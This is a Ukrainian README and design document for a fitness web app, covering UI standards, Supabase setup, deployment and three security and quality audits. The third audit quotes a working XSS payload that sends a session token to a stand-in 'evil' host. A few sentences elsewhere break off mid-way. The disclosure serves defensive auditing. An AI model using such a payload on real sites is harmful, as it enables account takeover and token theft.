Вибір живе у `localStorage('forge.theme')` і в профілі. Інлайн-скрипт у
head ставить `data-theme` ДО завантаження CSS — інакше при кожному переході
блимала б синя перед обраною.

### Імпорт профілю

Поруч з експортом. Вміст перевіряється за білим списком ключів
`blankProfile`: невідомі поля мовчки відкидаються, перед перезаписом —
підтвердження. Резервна копія, яку не можна відновити, не була резервною.

### PWA

`manifest.webmanifest` + іконки зі знака. Дає «додати на головний екран»
і запуск без адресного рядка. Службового воркера немає навмисно: офлайн-кеш
для сайту, що і так працює з file://, — зайвий рух.

## 14. Оформлення

Правило палітри: на сторінці рівно **один хроматичний колір** — `#15243B`.
Увесь інтерфейс чорно-білий; кольором позначені тільки кнопки, посилання,
активні стани, смуги даних і фокус. Зеленого, жовтого й помаранчевого немає
ніде: статуси розрізняються яскравістю рамки та іконкою.

`#15243B` темний (яскравість 23%), тому як колір **тексту** на чорному він дає
1.26:1 і нечитабельний. Він працює як поверхня картки, а посилання й кнопки
беруть світліші відтінки того самого тону (H = 216°). Ключова змінна —
`--acc-ink`: колір, яким акцент можна писати текст.

### Стандарти візуалізації

Чотири речі повторюються по всьому сайту. Кожна — **стандарт**: нові
екрани беруть готове, а не малюють свій варіант.

**1. Графік — це лінія, а не стовпчики.**

Кожен графік Get Stronger складається з чотирьох речей: сітка з підписаною лівою
шкалою, заливка під лінією, сама лінія, крапки на точках даних. Плюс
перехрестя й підказка при наведенні там, де точок багато. Стовпчиків на
графіках **немає ніде** — ні як другої серії, ні як «підпори» під крапками.

Причина не в смаку. Стовпчик — це відстань **від чогось**, і око читає його
як частку від нуля. Але жоден показник Get Stronger не має осмисленого нуля в
масштабі свого графіка: вага тіла живе в діапазоні 80–85 кг, разовий
максимум — 95–110. Графік від нуля перетворює всю різницю на плоский
паркан; графік від «зручного» дна робить висоти стовпчиків неправдивими —
удвічі вищий стовпчик не означає удвічі більше число. Лінія такої проблеми
не має: вона показує **зміну**, а не частку, і зрізана шкала їй не шкодить,
бо ніхто й не читає лінію як пропорцію.

Правило **не** стосується форм, які показують **склад**, а не зміну в
часі: горизонтальних смуг прогресу (`.vol__bar`, `.qi-bar__track`, `.split`) і
кільцевої діаграми (`js/donut-core.js`).
Там нуль реальний, частки складаються в ціле, і питання інше — не «куди я
рухаюсь», а «з чого це складається». Смуга й кільце ≠ графік.

Кільце КБЖВ стоїть у двох місцях і навмисно однакове в обох: у дні на
«Харчуванні» (факт) і в нормі на «Плані харчування» (ціль). План і факт
мають виглядати однаково, інакше порівняти їх оком неможливо. Смуги
макросів на плані більше немає — на 3% клітковини від неї лишалась риска
в два пікселі, а межі між сегментами доводилось малювати лінією тла, бо
сусідні заливки не тримали 3:1 одна до одної.

Це виглядає на практиці так: три сектори (білок, жири, вуглеводи), калорії в дучці. Два
правила, які легко порушити й важко помітити:

- **Сектори міряються в кілокалоріях, а не в грамах.** Грам жиру несе
  9 ккал, грам білка — 4; кільце «за грамами» показувало б жир удвічі
  меншим, ніж він є в раціоні, і не сходилось би з калоріями в центрі.
- **У центрі — та сама цифра, що в плитці «ккал за день».** Перша збірка
  ставила туди суму трьох секторів (932), тоді як плитка за два
  сантиметри нижче показувала 949: різниця — калорійність клітковини.
  Клітковина тепер порахована всередині вуглеводів (вона і є вуглевод),
  а окремого сектора не має — інакше це вже не КБЖВ.

**2. Календар днів — один компонент, `js/daycal-core.js`.**

Розкладка одна скрізь: підписи днів тижня колонкою зліва, тижні —
колонками вправо, підписи місяців над ними, тонкий роздільник у проміжку
між місяцями. Клітинка спільна (`.mcal__cell`, розділ «СТАНДАРТНА
КЛІТИНКА ДНЯ» у `css/style.css`) із чотирма сходинками заповненості.
**Новий екран бере `DayCal.html()`, а не пише свою сітку.**

```js
DayCal.html({
  from: '2026-09-01',        // перший день вікна
  to:   '2026-09-09',        // останній ДІЯЛЬНИЙ день; далі — бліді
  until:'2026-11-30',        // (опц.) докуди тягнути сітку вперед
  cell: (key, date, isFuture) => ({ lvl, sel, label, attrs }) // або null
})
```

Модуль не знає нічого про дані — він рахує лише геометрію тижнів і
місяців. Що показує клітинка, вирішує колбек `cell()`. Тому одна сітка
обслуговує три різні семантики:

| Екран | Що означає заливка | Клік |
|---|---|---|
| Історія тренувань (`#jr-hcal`) | частка закритих підходів, 4 сходинки | підсумок дня |
| Зважування (`#jr-weight`) | бінарно: є запис ваги / немає | вибрати день для запису |
| Сезон (`#sz-cal`, рейтинг) | **межа сезону**: залито рівно два дні — перший і останній | немає, клітинки не кнопки |

Третій рядок — той, про який легко забути. У календарі сезону виникає
спокуса залити минулі дні «щоб було видно прогрес», але в журналі залита
клітинка означає «цього дня я тренувався». Одна плитка не може означати
на сусідніх сторінках різні речі — саме заради цього клітинку колись і
звели в один клас. Тому минулі дні сезону — звичайні, майбутні — бліді,
сьогодні — кільце, а кольору рівно два дні.

Місяць колонки визначається за її **четвергом**, тобто за місяцем, якому
належить більшість днів колонки (той самий принцип, що в ISO-8601 для
номера тижня). За першим днем колонки роздільник з'їжджав би на тиждень
для кожного місяця, що починається в четвер–неділю.

Стережуть правило: `tests/daycal-core.test.js` (геометрія, межі місяця,
локальні дати, екранування) і `tools/verifydaycal.mjs` — він порівнює
структурні відбитки всіх трьох календарів сайту й падає, якщо в сезонному
залито більше ніж дві клітинки.

**3. Нижня панель розділів на телефоні — скляна капсула.**

До ширини 900px чотири щоденні розділи стоять унизу екрана плаваючою
капсулою в стилі таб-бару iOS: скло з розмиттям фону, плашка під активним
розділом, лінза, що їде за пальцем і збільшує те, що під нею. Файли:

| Файл | Що в ньому |
|---|---|
| `js/liquid-glass.js` | оптика: карта зміщення на canvas → `feDisplacementMap` → `backdrop-filter: url(#id)`. Прийшов готовим пакетом, лежить майже без змін |
| `js/tabbar-glass.js` | жест і геометрія панелі |
| `css/style.css`, блок `.tabbar` | усі розміри в CSS-змінних `--tb-*` |
| `js/app.js`, `buildTabBar` | розмітка й ліниве підвантаження двох файлів вище |

Чотири речі, які легко зламати непомітно:

- **Предок не може бути backdrop root.** `backdrop-filter` бачить лише
  те, що намальовано в межах свого backdrop root, а створює його будь-який
  предок із `filter`, `opacity < 1`, `mask`, `mix-blend-mode`,
  `isolation` або `contain: paint`. Досить додати щось із цього на
  `#tabbar` чи `body` — і скло перестане бути склом, не змінивши жодного
  оголошення в самій панелі.
- **Лінза — СУСІД панелі, а не її дитина.** У панелі власний
  `backdrop-filter`, тобто вона backdrop root для своїх дітей, і лінза
  всередині заломлювала б порожнечу. Саме заради цього над `<nav>` є
  зайвий на вигляд `<div class="tabbar">`.
- **Пункти лишаються `<a href>`.** Жест накладений поверх посилань:
  короткий дотик не перехоплюється взагалі, протяг (понад 8px) веде
  лінзу й на відпусканні переходить сам. `setPointerCapture` вмикається
  ЛІНИВО — якщо захопити вказівник одразу на `pointerdown`, `pointerup`
  прилітає в `<nav>`, браузер дає клік теж по `<nav>`, і посилання мовчки
  перестає працювати. Плюс `draggable="false"`: рідне перетягування
  посилання забирає жест і шле `pointercancel` на першому ж русі.
- **Радіус блюру — 6px, і це виміряне значення.** У програмному
  растеризаторі Chromium більший радіус тихо деградує: нормована
  різкість фону під панеллю 0,25 при 6px, 0,43 при 10px і 0,70 при 20px.
  Читабельність підписів тримає не блюр і не заливка, а
  `brightness(.92)` усередині `backdrop-filter`.

Стереже `tools/verifytabbar.mjs` (44 перевірки): геометрія на 320/390/430,
обидва жести, робота без завантаженого скла, відсутність панелі на
десктопі й — окремим блоком — те, що фон під панеллю СПРАВДІ розмитий
(знімок читається назад через canvas і міряється нормована різкість).

**4. Жетон рівня — скляна кулька, яку малює код.**

`levelIcon(level, label)` у `js/app.js` повертає інлайновий SVG. Місць
показу три: значок у шапці (`.nav__rating`), герой рейтингу і звіт про
закритий сезон (`.lvl-circle` у `js/season.js`). Геометрія:
`LVL_ARC = 288°`, `r = 38`, поворот на 126° (нуль шкали на лівому краю
розриву), дуга — це `stroke-dasharray` на `<circle>`, а не `<path>` з
командою `A`. Раніше це були десять файлів `icons/levels/lvl-1..10.svg`,
і вони встигли розійтися між собою.

Скло тут із двох частин: розмиття фону дає `backdrop-filter` на самому
`.lvl-ico`, оптику — SVG трьома шарами (тіло, полиск, кант).

Чотири речі, які тут ламаються тихо:

- **Кант — ОДНЕ кільце.** Спершу їх було два: зовнішній кант і
  внутрішній обід відбитого світла. По низу вони світилися обидва, по
  верху — одне, і диск читався як кривий, хоча геометрично був
  ідеальний. Тепер обидві світлі долі (пряме світло зверху-ліворуч і
  відбите знизу-праворуч) живуть на одному градієнті.
- **Ширина штриха тримає шкалу концентричною.** Під пройденою частиною
  колись лежав ширший напівпрозорий ореол («світіння без `filter`», як у
  старих файлах): видима смуга зліва ставала на 5px товща за смугу
  справа. Дуг у малюнку мусить бути рівно дві.
- **Тіло — на весь `viewBox` (`r = 50`).** Стовп розмиття обрізається
  `border-radius: 50%` по межі елемента; менший радіус лишав би по краю
  кільце розмиття без скла над ним.
- **Колір живе в CSS.** У розмітці лишилась сама геометрія; відтінки —
  на класах `.lvl-ico__b0`, `__g0`, `__e0` тощо. `var()` у
  презентаційних атрибутах SVG (`stop-color="rgba(var(--x),.1)"`)
  підтримується не в кожному рушії й падає мовчки — прозорим.

**Під курсором кулька росте й по ній їде полиск; на дотику жетон
статичний.** Це не економія, а вимога: `:hover` на дотику залипає після
тапу, тобто жетон лишався б підсвіченим доти, доки не торкнешся іншого
місця. Увесь блок анімації живе всередині
`@media (hover: hover) and (pointer: fine)`. Розмиття при цьому
залишається завжди — скло не потребує курсора, воно потребує світла
позаду (та сама помилка колись стояла в перевірці скляних карток, де
разом із нахилом гасили й `backdrop-filter`).

Шкала рівнів — пʼять сходинок на десять рівнів (1 · 2–3 · 4–7 · 8–9 · 10)
відтінками проєкту: білий → зелений → бурштин → помаранч → червоний.
Десять відтінків із кроком в один рівень ніхто б не розрізнив, і тоді
зміна кольору перестала б щось означати; тут кожна зміна — перехід у
наступну «лігу».

Стереже `tools/verifylevelicon.mjs` (50 перевірок). Головне в ньому —
не читання атрибутів, а ВИМІР: `elementFromPoint` іде горизонталлю через
центр і питає в браузера, що саме намальоване в кожній точці, тож
зовнішня й внутрішня межі шкали мусять збігатися зліва й справа.
Перевірка на клас цього НЕ бачила — у самої дуги ширина була правильна,
зайвим був шар під нею. Окремий блок піднімає другий контекст
(`isMobile`, `hasTouch`) і доводить, що там немає ні росту, ні блику,
але розмиття лишається.

## 15. Увімкнути акаунти й спільну базу

Без цього кроку сайт працює в **локальному режимі**: усі дані лежать у localStorage браузера.
Це нормально для одного пристрою, але друзі не матимуть своїх акаунтів.

### Крок 1 — створити проєкт

1. Зареєструйся на [supabase.com](https://supabase.com), створи проєкт (безкоштовний тариф підходить)
2. Обери регіон ближче до себе — це впливає на затримку

### Крок 2 — виконати схему

Supabase → **SQL Editor** → **New query** → виконай файли В ЦЬОМУ ПОРЯДКУ:

1. `db/account-approval.sql` — заявки на акаунт, адміни, `is_approved`
2. `db/schema.sql` — профілі й політики доступу
3. `db/elo-engine.sql` — таблиці й функції рейтингу
4. `db/elo-authoritative.sql` — сервер рахує ELO зі своїх даних

Порядок обовʼязковий: політики в `schema.sql` посилаються на `is_approved`
з першого файлу. Виконати `schema.sql` окремо не вийде — впаде на невідомій
функції, і це навмисно: раніше файл створював політики БЕЗ перевірки
підтвердження й тихо знімав барʼєр із робочої бази.

Перевірити, що рейтинг не приймає підроблених даних: `db/elo-tests.sql`
(виконується так само в SQL Editor, транзакція відкочується сама).

Перевір, що все стало:

```sql
select tablename, rowsecurity from pg_tables where tablename = 'profiles';
-- rowsecurity = true

select policyname, cmd from pg_policies where tablename = 'profiles';
-- 4 рядки: SELECT / INSERT / UPDATE / DELETE
```

### Крок 3 — вписати ключі

Supabase → **Settings** → **API**. Скопіюй `Project URL` і ключ `anon / public`.

```js
// js/config.js
supabase: {
  url:     'https://xxxxxxxxxxxx.supabase.co',
  anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
}
```

**Про безпеку anon-ключа.** Він публічний за задумом Supabase — його видно в коді
будь-якого сайту на цьому стеку. Доступ до даних обмежується не ключем, а політиками RLS
у Postgres: запит без валідного JWT не побачить жодного рядка.
Ключ `service_role` у фронтенд **класти не можна ніколи** — він обходить RLS.

### Крок 4 — обмежити реєстрацію (сайт для своїх)

За замовчуванням зареєструватись зможе будь-хто, хто відкриє сайт. Варіанти:

- **Найпростіше:** Authentication → Providers → Email → вимкнути `Enable signups`.
  Далі створюєш акаунти друзям вручну через Authentication → Users → Add user.
- **Гнучкіше:** лишити реєстрацію ввімкненою, але додати тригер на `auth.users`,
  який відхиляє пошту не зі списку дозволених.

## 16. Викласти в інтернет

Сайт статичний, тому підійде будь-який хостинг статики.

**Vercel:**

```bash
npx vercel --prod
```

**GitHub Pages:** запуш папку в репозиторій → Settings → Pages → Deploy from branch.

**Netlify:** перетягни папку у вікно [app.netlify.com/drop](https://app.netlify.com/drop).

Після деплою додай домен у Supabase → Authentication → URL Configuration → Site URL,
інакше підтвердження пошти вестиме не туди.

І впиши той самий домен у `js/config.js`:

```js
siteUrl: 'https://твій-домен',
```

Після цього `js/app.js` сам додасть на кожну сторінку `og:url`. Поки поле
порожнє — тега просто немає, і це навмисно: відносне посилання в картці
нічого не означає, а неправильне абсолютне шкодить більше, ніж його
відсутність.

Але одного `config.js` мало. Краулери превʼю в месенджерах — Telegram,
Slack, WhatsApp — JavaScript не виконують узагалі, тож теги, дописані
`app.js` у рантаймі, вони не побачать. Перед викладенням запусти:

```bash
node tools/build-meta.js
```

Скрипт впише `og:url` прямо в розмітку всіх сторінок. Повторний запуск
оновлює вже проставлене, а не дублює; запуск із порожнім `siteUrl` —
навпаки, прибирає теги, щоб у розмітці не лишалось посилань на старий
домен.

`canonical` і `sitemap.xml` він більше не робить: сайт навмисно поза
пошуком, див. розділ «SEO» нижче.

**Повний порядок дій перед релізом — у `RELEASE.md`.** Там же вимоги до
хостингу (стиснення, заголовки кешу) і чесний перелік того, що свідомо
НЕ зроблено: service worker, мініфікація, самостійний хостинг шрифтів.

## 17. Третій аудит: що знайдено й виправлено

Найповніший із трьох. Знайдено близько шістдесяти дефектів; нижче — ті, що
міняли поведінку. Кожна цифра тут отримана виконанням коду, а не оцінкою на око.

### Перший вхід в акаунт знищував локальні дані (найсерйозніше)

`js/store.js`. Людина місяць працює локально — рецепти, журнал ваги, кастомні
плани. Реєструється. `getProfile()` читає порожній хмарний рядок, повертає
`Object.assign(blankProfile(), null)`, і перше ж збереження пише бланк у
localStorage поверх усього. Ні мерджу, ні підтвердження, ні бекапу — при тому
що сторінка акаунта обіцяла «дані синхронізуються між пристроями».

Тепер: якщо в хмарі порожньо — локальне стає хмарним; якщо непорожні обидва —
вибір робить людина. У будь-якому разі копія лягає в `ib.profile.backup` ще до
того, як щось вирішено.

### XSS через імпорт профілю

`js/meals.js` — поле `containers` було **єдиним** неекранованим полем рецепта
в усьому файлі. Разом з імпортом, який не перевіряв значень узагалі, це давало
виконання коду: надісланий `forge-profile.json` із
`containers: "<img src=x onerror=fetch('//evil/'+localStorage['ib.session'])>"`
крав `refresh_token`, тобто акаунт назавжди. Другий вектор — `ex.sets` у
`js/programs.js`, звідки розмітка потрапляла в живий DOM запасним шляхом
`copyRich`.

### Імпорт зіпсованого JSON ламав сторінку назавжди

Білий список ключів перевіряв імена, але не вміст. Файл із
`{"day":{"meals":[{"name":"Обід"}]}}` проходив і вбивав «Раціон»: `m.items.length`
у обʼєкті без `items` кидав TypeError. Полагодити можна було лише через DevTools,
бо биті дані вже лежали в профілі — а в хмарному режимі ще й розліталися на всі
пристрої. Тепер кожне значення перевіряється за формою, а що не проходить —
відкидається **поіменно**, і про це видно в діалозі.

### Вісім способів мовчки втратити збереження

Усі однакової природи: користувач бачить «Збережено», даних немає.

| Де | Що було |
|---|---|
| `store.js` | `ensureFresh()` повернув `false` → гілка POST не виконувалась, а функція резолвилась успішно |
| `account.js` | `flushSave` на `pagehide` слав звичайний `fetch` — браузер його скасовував. Тепер `keepalive` |
| `store.js` | офлайн-зміни нікуди не доїжджали: `getProfile` завжди віддавав перевагу хмарі. Тепер є черга й досилання по `online` |
| `store.js` | `QuotaExceededError` проковтувався: `lsSet` повертав `false`, який ніхто не читав |
| 9 місць | порожні `.catch(function () {})` ховали і 500, і відмову RLS |
| `store.js` | `ensureFresh` без локу: три модулі на `plan.html` слали три refresh з одним токеном, і Supabase відкликав сесію |
| `store.js` | слухач `storage` стояв усередині `if (CLOUD)` — у локальному режимі (тобто за замовчуванням) синхронізації між вкладками не було зовсім |
| `store.js` | `clearSession` не чіпав `ib.profile`: у спільному браузері наступний користувач бачив чужі дані, і його збереження зливало їх у ЙОГО хмарний рядок |

### `Store.onChange` передавав не той обʼєкт

`emit()` викликав `fn(api.user())`, а `js/journal.js` чекав на профіль. У
локальному режимі `user()` завжди `null`, у хмарному приходив `{id, email}` без
потрібних полів. Через це обіцянка «день позначається сам, коли додзвонив
таймер» не працювала **в жодному режимі**. Тепер перший аргумент — профіль.

### Калькулятор 1ПМ обходив запобіжники власного ядра

`js/onerm.js` викликав `f.fn(weight, reps)` напряму замість `OneRM.estimates()`.
Ввід 100 кг × 30 повторень — у межах `max` самого поля — давав у таблиці
**Brzycki 514,3 кг** із підписом «розкид 204%». Ядро від цього було захищене,
сторінка — ні. Додано ще й відносний відсів: оцінка понад 2,5 ваги підходу
відкидається, бо фізіологічно такого не буває.

### Прогноз показував «+−0,5»

`js/projection.js` округляв до 2,5 кг усі вправи, ігноруючи власне рішення
проєкту про крок за вагою. Махи 8 кг за пів року: модель дає 8,58 → таблиця
друкувала **«7,5 +−0,5»**. Знак «+» був захардкоджений.

### Решта, коротко

- **Кардіо**: єдиною перевіркою було `age > 0`. Вік 300 → `hrMax = 208 − 210 = −2`,
  і вся таблиця зон малювалась відʼємними числами. Плюс: нульовий резерв пульсу
  (`hrMax` = `hrRest`) давав пʼять однакових зон «105–105» замість помилки.
- **Періодизація**: `currentWeek` рахував від позначки *часу* запуску, тому цикл,
  стартований о 23:00, перемикав тиждень усередині доби. Тепер — календарні дні.
- **Відпочинок** призначався за розміром групи, а не типом вправи: «Розгинання ніг»
  отримувало 3 хв, бо квадрицепс `large`. Через це fullbody-3 оцінювався у 116 хв.
  Поле `lift` уже було в даних — тепер воно й вирішує.
- **`dayMinutes`** додавав відпочинок після останнього підходу останньої вправи.
- **«Разова» міграція ваг** крутилась при кожному завантаженні й воскрешала щойно
  скинуті ваги: делоуд 100 → 90, F5, міграція бачить 100 у старому плані й повертає.
- **`oneRepMax(w, 0)`** повертав `w`: умова `r <= 1` ловила й нуль.
- **Магній**: рекомендована доза 400 мг перевищувала UL з добавок (350 мг IOM,
  250 мг EFSA) — єдина така позиція в списку. Додано протипоказання креатину при
  захворюванні нирок і застереження мелатоніну для підлітків і вагітних.
- **Дані продуктів**: шрірача мала числа солодкого чилі-соусу (140 проти 93 ккал),
  кукурудза — вуглеводи, не узгоджені з власною калорійністю, консервований ананас
  лежав у групі «Овочі».
- **`split()`** у розподілі на прийоми давав відʼємні значення: `split(3, 6)` →
  `[-2, 1, 1, 1, 1, 1]`.
- **Межа жиру 3/60** була строгою на одній сторінці й включною в ядрі: на рівно 60%
  «Харчування» рахувало за Mifflin (2759 ккал), а «Раціон» за Katch (1645) —
  різниця 1114 ккал для одного профілю.
- **Три різні набори меж грамів** у `meals.js`: ввід 999999 г показувався як є,
  а калорії рахувались від 100 000.

### Доступність і оформлення

- **Фокус-кільце полів вводу було невидиме**: `.input:focus{outline:none}`
  (специфічність 0,2,0) бив глобальний `:focus-visible` (0,1,0), і лишалась тінь
  із контрастом **1,03:1** при нормі 3:1. Людина з клавіатурою не бачила, де вона.
- **Теплокарта**: нео-шар перебив `color:#0b0e14` на `#fff`, і позначений день
  давав 3,75:1 у базовій темі, 2,74:1 у рожевій. Повернуто темний текст (5,15–7,04:1).
- **Закриті акордеони** лишались у таб-порядку й у дереві доступності: CSS стискав
  висоту до нуля, але `display:none` не ставив. Додано `inert` і `aria-controls`
  (їх не було **жодного** в усьому проєкті).
- **Контраст**: `--g3` 2,49:1, `--placeholder` 4,02:1, `--acc-line` 2,76:1 — усі
  підняті вище норми й перевірені в чотирьох темах розрахунком.
- **`og:image` не було ЖОДНОГО** на 12 сторінках при `twitter:card=summary`.
- **Сторінка залежала від того, що JS не впаде**: помилка до кінця `boot()` давала
  білу сторінку. Тепер кроки ініціалізації ізольовані, а `.js` знімається і по
  `window.onerror`, і по таймеру.
- **Layout thrashing**: коментар докладно описував батчинг через `requestAnimationFrame`,
  якого в коді не було зовсім.

### Тести

Головна зміна, а не дрібниця: **тестів не було взагалі**. Половина знахідок цього
аудиту — регресії в числах, які юніт-тест спіймав би одразу. Тепер їх 74, вони
покривають три ядра й довідники, працюють на вбудованому runner Node і не тягнуть
жодної залежності.

## 18. Другий аудит: що знайдено й виправлено

Перший аудит (розділ нижче) закрив сміттєвий ввід, XSS і доступність.
Другий шукав те, що ховається в **послідовностях дій** і в станах між
сторінками — там, де окремо кожен крок правильний.

### Знімок скидання ваг лишався чинним назавжди (найсерйозніше)

Сценарій: захворів → скинув ваги на 10% → одужав → три тижні піднімав по
2,5 кг → натиснув «Повернути як було». Кнопка стирала всю прогресію, бо
знімок описує стан **до хвороби**. Відтворено: біцепс 25 → 22,5 → 30 → знову 25.

Виправлено: крок вгору зʼїдає знімок. «Повернути» означає «відкотити щойно
зроблене скидання», а не «перемотати на довільну точку в минулому». Щойно
рушив далі — кнопка зникає. Закрито тестом `deloadtest`, п. 6b.

### Незбережені зміни губились при переході зі сторінки

Профіль пишеться із затримкою 400 мс (щоб при вводі «180» не зберегти
спершу «1» і «18»). Якщо піти на іншу сторінку одразу після вводу, ці
400 мс сторінка не переживає — поле показувало нове число, а в профіль
воно не доїхало.

Виправлено: `flushSave()` на `visibilitychange` і `pagehide`. Побічно
довелося перенести злиття рекордів 1ПМ у момент вводу: `Store.saveProfile`
зливає **поверхнево**, тож патч `{records:{bench:100}}` затер би присід і
станову, а на вивантаженні сторінки дочитати профіль через `await` вже
пізно. Закрито тестом `acctest`, п. 7.

### Головна сторінка була закрита від індексації

`index.html` мав `<meta name="robots" content="noindex">` — залишок від
того, як цей тег ставили на сторінку акаунта. Виходила суперечність:
підсторінки індексуються, а вхід — ні. Прибрано; на `account.html`
залишено навмисно, там особисті дані.

### Скрипти блокували розбір сторінки

Усі 3–9 скриптів на сторінку вантажились без `defer`. Додано на всі 11
сторінок. Перевірено сумісність: `document.write` ніде немає, а єдиний
інлайновий скрипт (`plan.html`) тільки реєструє слухача `plan:change` і
бере елементи, оголошені вище — з `defer` він тепер відпрацьовує навіть
раніше, ніж потрібно.

### Межі сегментів у складених смугах не читались

Порахував контраст сусідніх заливок: білок ↔ жири **2,80:1**, мʼязи ↔ жир
**2,74:1** при нормі 3:1. Рознести три сірих далі по яскравості на темному
тлі неможливо — найтемніший тоді зіллється з карткою. Додано розділювач
кольором тла (`box-shadow: 1px 0 0`), який знімає питання незалежно від
контрасту заливок.

### Дрібніше

- Пропуск рівня заголовка на сторінці акаунта: `h1 → h3`. Картки підняті
  до `h2`, підзаголовки груп — до `h3` з класом `.group-title`, який пінить
  кегль, щоб вигляд не змінився.
- `<textarea>` запасного копіювання плану не мав доступного імені —
  додано `aria-label`.
- `plural()` і `dateLabel()` існували двома посимвольними копіями в
  `programs.js` і `periodization.js` — винесені в `app.js`.
- Мертвий CSS-клас `.stat` — залишок від блоку цифр, який прибрали з
  головної. Видалено.
- Два послідовні записи профілю в одній дії злиті в один: перший міг
  пройти, а другий упасти, лишивши стан, якого користувач не робив.

### Що перевірено й виявилось справним

Синтаксис 21 файлу JS, баланс тегів 11 сторінок, дужки CSS, усі локальні
посилання, 177 класів CSS на використання, дублювання тіл функцій між
файлами, залишки розробки (`console.log`, `debugger`, `TODO` — нуль;
знайдені три `console.warn/error` виявились діагностикою хмари), картинки
контраст усіх
текстових пар палітри, брейкпоінти, `alt` на всіх зображеннях, доступні
імена всіх кнопок і полів на зібраному DOM.

## 19. Що зроблено в першому аудиті

Разовий прохід «усе, що можна зламати» — окремим розділом, щоб потім не
гадати, навіщо в коді ті чи інші перевірки.

### Сміттєвий ввід більше нічого не ламає

`edgetest.js` кидає 23 різні недоречні значення (`null`, `NaN`, `''`, `-1`,
`1e308`, `Infinity`, рядок на 5000 символів, `{}`, `[]`, `true`) у кожен
калькулятор: 529 комбінацій у харчуванні, 2116 у перерахунку продуктів,
плюс прогноз ваг, пульсові зони й усі сім формул 1ПМ.

Було **47 місць**, де назовні витікав `NaN` або `Infinity`. Стало **0**.
Виправлено в трьох файлах:

- `js/nutrition-core.js` — `LIMITS` + `bounded()`: кожне поле профілю
  перевіряється на фізіологічний діапазон (вага 30–300, зріст 120–250,
  вік 10–100, жир 3–60, активність 1,0–2,5). Поза діапазоном — `null`,
  а не «порахуємо з чого є». `macros()` додатково перевіряє **результат**.
- `js/foods.js` — `MAX_GRAMS = 100000` і затиск грамів у `[0, MAX_GRAMS]`.
  Без цього `1e308` грамів давало `Infinity` калорій.
- `js/projection.js` — `growth()` і `project()` перевіряють вхід і вихід
  на `Number.isFinite`, вага бази обмежена 500 кг.

Межі задані на рівні ядра, а не форм: поля з `min`/`max` захищають лише від
випадкового вводу, але не від збереженого зіпсованого профілю чи від виклику
функції з іншого модуля.

### XSS у посиланні на рецепт

`esc()` екранує `& < > " '` — цього досить усередині тексту, але **не** в
`href`. Посилання виду `javascript:…` проходило екранування без змін і
виконувалось при кліку. Рецепти створює сам користувач, тож на своєму
браузері це не атака, а от у спільній базі — вже так.

Додано `safeUrl()` у `js/app.js`: розбирає схему й пропускає тільки
`http`, `https`, `mailto` та відносні шляхи. Усе інше — `javascript:`,
`data:`, `vbscript:`, `file:` — перетворюється на порожній рядок, і посилання
не рендериться взагалі. Перевірено 13 випадками.

### Доступність

- **Skip-link** — перший елемент у порядку табуляції на всіх 10 сторінках.

**Сайт навмисно поза пошуком** (13.09.2026). Get Stronger — приватний

Разом із рішенням прибрано весь апарат індексації, який доти жив поруч і

тримати брехливу підказку наступному читачеві — у переліку сторінок
скрипта стояв коментар «Сторінки, які має бачити пошук».

Що ЛИШИЛОСЬ і чому це не суперечність:

- **Open Graph + Twitter Card на всіх сторінках.** Превʼю в месенджері —
  не пошук: краулер Telegram, Slack чи WhatsApp `X-Robots-Tag` не читає,
  він просто тягне сторінку заради картки. Тому og:* лишається, і
  лишається СТАТИЧНО в розмітці (`tools/build-meta.js`) — ті краулери не
  виконують JS.
- **`robots.txt` із `Allow: /`.** `Disallow` заборонив би боту ЗАХОДИТИ,
  тобто він не прочитав би заголовка `noindex`, і адреса могла б
  потрапити у видачу самим лише URL. Тому шлях відкритий, а рішення
  виконує заголовок.
- **Осмислені `<title>`.** Вони видно у вкладці браузера й в історії, а
  не лише у видачі.

Цілісність рішення стереже `tests/noindex.test.js`: або сайт закритий і
апарату немає, або хтось свідомо міняє і те, і те разом.

## Обмеження, про які варто знати

- **КБЖВ продуктів — орієнтир, не вимір.** Джерела не з PubMed (їх там і не буває):
  таблиці складу USDA й етикетки виробника. Допуск етикетки в ЄС — до ±20%.
  Коефіцієнт виходу після готування залежить від способу приготування.
- **Базові рецепти написані мною**, а не взяті з відео. Для своїх — конструктор із полем
  для посилання на першоджерело.
- **День у раціоні один**, поточний. Це не щоденник харчування: історії немає,
  новий день перетирає попередній.
- **Розрахунки калорій — популяційні регресії.** Похибка для конкретної людини ±10–15%.
  Це стартова точка, яку коригуєш за фактичною динамікою ваги, а не норма.
- **Мінімум 3 прийоми їжі** — калькулятор не рахує розкладку на 1–2 прийоми.
- **Білок фіксовано на 2 г/кг маси тіла** для всіх цілей. Це вище порогу, після якого
  приросту маси вже немає (~1,6 г/кг), і на нижній межі діапазону, рекомендованого
  для дефіциту. На довгій агресивній сушці є сенс піднімати до 2,4–2,6 г/кг вручну.
- **Добавки — не медична порада.** Сторінка показує, що знайдено в дослідженнях,
  і де дані слабкі. Взаємодії з ліками й хворобами вона не враховує.
- **Сайт нічого не рекомендує.** Він показує фактичні характеристики схем
  (частота на групу, тижневий обʼєм, тривалість сесії) — вибір за тобою.
- **Формули 1ПМ ламаються на високих повтореннях.** Понад 10 повторень оцінка ненадійна;
  найточніший діапазон — підхід на 3–6 повторень майже до відмови.
- **Немає трекера тренувань.** Сайт підбирає програму й рахує цифри, але не веде щоденник
  підходів. Робочі ваги в плані правляться вручну. Через це прогноз нема з чим звіряти:
  він показує модель, а не факт. Журнал — це наступна таблиця в базі й нова сторінка.
- **Прогноз ваг не має джерела і не може його мати.** Форма кривої обґрунтована,
  конкретні коефіцієнти — конвенція. Дивись на порядок величини й на розхід сценаріїв,
  а не на число через рік.
- **Профіль зберігається як jsonb.** Зручно для швидких змін схеми, але не дає перевірки
  типів на рівні БД. Якщо колись знадобиться аналітика по полях — виносити в колонки.
- **`color-mix()` у CSS** використовується для напівпрозорих поверхонь навбару.
  Працює в усіх сучасних браузерах, але в дуже старих версіях навбар буде
  повністю непрозорим замість напівпрозорого. На функціональність не впливає.
- **Google Fonts** тягнеться зі сторонього домену. Якщо хочеш повну автономність —
  завантаж шрифти локально й прибери `<link>` зі сторінок.

## 20. Приблизний день харчування: «невідомо» ≠ «нуль»

Швидкий запис дня (D2, «Швидкі калорії») дав змогу закрити день одним
числом замість розбору по грамах. Задум простий: для моделі, яка вчиться
на з'їденому, неповний день нескінченно кращий за порожній, бо порожній
читається як голодування.

Але запис писав `pTarget` навіть тоді, коли білка в дні немає. Для
сервера `pTarget > 0` означає «є з чим порівнювати»: `elo_facts` віддає
пару `protein/proteinTarget`, `elo_action_delta` ділить одне на друге й
